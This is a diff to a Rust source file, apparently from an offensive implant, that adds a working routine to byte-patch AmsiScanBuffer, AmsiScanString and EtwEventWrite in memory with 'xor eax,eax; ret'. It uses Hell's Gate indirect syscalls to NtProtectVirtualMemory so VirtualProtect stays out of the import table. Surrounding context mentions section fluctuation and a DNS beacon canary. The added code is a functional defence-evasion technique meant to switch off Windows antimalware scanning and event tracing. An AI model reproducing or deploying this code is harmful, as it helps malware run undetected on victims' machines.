@@ -257,6 +257,50 @@ pub fn fluctuate_sections(key: u8) {
     }
 }
 
+// ── AMSI / ETW patch ─────────────────────────────────────────────────────────
+
+/// Byte-patch AmsiScanBuffer, AmsiScanString (AMSI bypass) and EtwEventWrite.
+/// Patch bytes: xor eax,eax; ret = [0x31, 0xC0, 0xC3]
+/// Uses NtProtectVirtualMemory (indirect syscall) — no VirtualProtect in IAT.
+pub fn patch_amsi() {
+    const PATCH: [u8; 3] = [0x31, 0xC0, 0xC3];
+    unsafe {
+        use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress, LoadLibraryA};
+        // Load amsi.dll (no-op if already present — required before CLR/PS execution)
+        let amsi = LoadLibraryA(b"amsi.dll\0".as_ptr());
+        if amsi != 0 {
+            for sym in [b"AmsiScanBuffer\0".as_ref(), b"AmsiScanString\0".as_ref()] {
+                let f = GetProcAddress(amsi, sym.as_ptr())
+                    .map(|p| p as *const () as usize)
+                    .unwrap_or(0);
+                if f != 0 { write_patch(f, &PATCH); }
+            }
+        }
+        let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
+        let ntdll = GetModuleHandleW(ntdll_w.as_ptr());
+        if ntdll != 0 {
+            let f = GetProcAddress(ntdll, b"EtwEventWrite\0".as_ptr())
+                .map(|p| p as *const () as usize)
+                .unwrap_or(0);
+            if f != 0 { write_patch(f, &PATCH); }
+        }
+    }
+}
+
+unsafe fn write_patch(addr: usize, patch: &[u8]) {
+    let mut base = addr as *mut u8;
+    let mut sz   = patch.len();
+    let mut old  = 0u32;
+    if crate::hells_gate::nt_protect_virtual_memory(
+        usize::MAX, &mut base as *mut *mut u8, &mut sz, 0x40, &mut old
+    ) >= 0 {
+        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr as *mut u8, patch.len());
+        crate::hells_gate::nt_protect_virtual_memory(
+            usize::MAX, &mut base as *mut *mut u8, &mut sz, old, &mut old
+        );
+    }
+}
+
 // ── DNS canary ────────────────────────────────────────────────────────────────
 
 /// Fire a DNS canary by resolving "beacon.<domain>".
